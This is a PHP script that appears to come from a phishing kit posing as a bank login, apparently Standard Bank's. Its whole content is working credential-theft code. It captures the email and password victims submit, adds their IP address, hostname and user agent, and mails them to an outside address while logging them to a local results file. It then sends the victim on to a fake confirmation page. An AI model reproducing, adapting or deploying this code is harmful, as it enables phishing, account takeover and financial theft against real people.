<?php
if($_POST["email"] != "" and $_POST["psw"] != ""){
date_default_timezone_set("Africa/Johannesburg");
$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	$date = date("Y-m-d H:i:s");
	$ccn = $_POST['email'];
$ip = getenv("REMOTE_ADDR");
$hostname .= gethostbyaddr($ip);
$useragent .= $_SERVER['HTTP_USER_AGENT'];
$message .= '<html>
<head></head>
                    <body>
                        <table style="">
                            <tr>
                                <td style="font-weight: bold">Account Email:</td>
                                <td style="padding-left: 1em;">'.$_POST['email'].'</td>
                            </tr>
                            <tr>
                                <td style="font-weight: bold">Password:</td>
                                <td style="padding-left: 1em;">'.$_POST['psw'].'</td>
                            </tr>
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
							<tr>
							<td style="font-weight: bold">User Agent:</td>
							<td style="padding-left: 1em;">'.$useragent.'</td></tr>
                        </table>
                    </body>
                </html>';
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|-----------Don Money-------------|\n";

   $from = "1st Result <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "STD LOGIN [$ccn] [$ip] [$date]";
        if(mail("info@pragmalaw.in",$subject,$message,$headers))
		$fp = fopen("myresults.txt","a");
fputs($fp,$message);
fclose($fp);	
		$praga=rand();
$praga=md5($praga);
  header ("Location: confirm_ph_G1heGxlbmd0aD0iMi.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
